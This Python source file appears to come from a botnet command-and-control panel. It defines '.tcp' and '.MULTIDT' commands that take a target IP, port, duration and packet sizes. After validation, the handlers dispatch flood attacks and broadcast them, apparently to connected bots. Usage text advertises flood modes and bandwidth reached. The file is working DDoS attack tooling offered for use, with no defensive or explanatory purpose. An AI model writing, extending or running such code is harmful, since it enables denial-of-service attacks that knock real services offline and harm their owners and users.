from colorama import Fore

def tcp_multi(args, validate_ip, validate_port, validate_time, validate_size, send, client, ansi_clear, attack_sent2, broadcast, data):
    if len(args) == 9:
        ip = args[1]
        port = args[2]
        secs = args[7]
        size = args[3]
        size2 = args[4]
        size3 = args[5]
        size4 = args[6]
        if validate_ip(ip):
            if validate_port(port):
                if validate_time(secs):
                    if validate_size(size):
                        if validate_size(size2):
                            if validate_size(size3):
                                if validate_size(size4):
                                    send(client, ansi_clear, False)
                                    size = "CAN'T LOADER SIZE !!"
                                    attack_sent2(ip, port, secs, size, client)
                                    broadcast(data)
                                else:
                                    send(client, Fore.RED + 'Invalid packet size4 (0-999999999999 bytes)')
                            else:
                                send(client, Fore.RED + 'Invalid packet size3 (0-999999999999 bytes)')
                        else:
                            send(client, Fore.RED + 'Invalid packet size2 (0-999999999999 bytes)')
                    else:
                        send(client, Fore.RED + 'Invalid packet size (0-999999999999 bytes)')
                else:
                    send(client, Fore.RED + 'Invalid attack duration (1-999999999999 seconds)')
            else:
                send(client, Fore.RED + 'Invalid port number (1-65535)')
        else:
            send(client, Fore.RED + 'Invalid IP-address')
    else:
        send(client, 'Usage: .MULTIDT [IP] [PORT] [SIZE1] [SIZE2] [MULTI1] [MULTI2] [SECS] [MODE]')
        send(client, '.MULTIDT [IP] [PORT] 256 256 2048 2048 [SECS] [MODE] <-- SOME TIME HIT 100 mb')
        send(client, '[MODE] USE FOR STARTING DDOS (THREAD) 1 = IDK FLOOD 2 = NORMAL FLOOD 3 = PYFLOOD')

def tcp(args, validate_ip, validate_port, validate_time, validate_size, send, client, ansi_clear, attack_sent2, broadcast, data):
    if len(args) == 5:
        ip = args[1]
        port = args[2]
        secs = args[3]
        size = args[4]
        if validate_ip(ip):
            if validate_port(port):
                if validate_time(secs):
                    if validate_size(size):
                        send(client, ansi_clear, False)
                        attack_sent2(ip, port, secs, size, client)
                        broadcast(data)
                    else:
                        send(client, Fore.RED + 'Invalid packet size (1-65500 bytes)')
                else:
                    send(client, Fore.RED + 'Invalid attack duration (10-1300 seconds)')
            else:
                send(client, Fore.RED + 'Invalid port number (1-65535)')
        else:
            send(client, Fore.RED + 'Invalid IP-address')
    else:
        send(client, 'Usage: .tcp [IP] [PORT] [TIME] [SIZE]')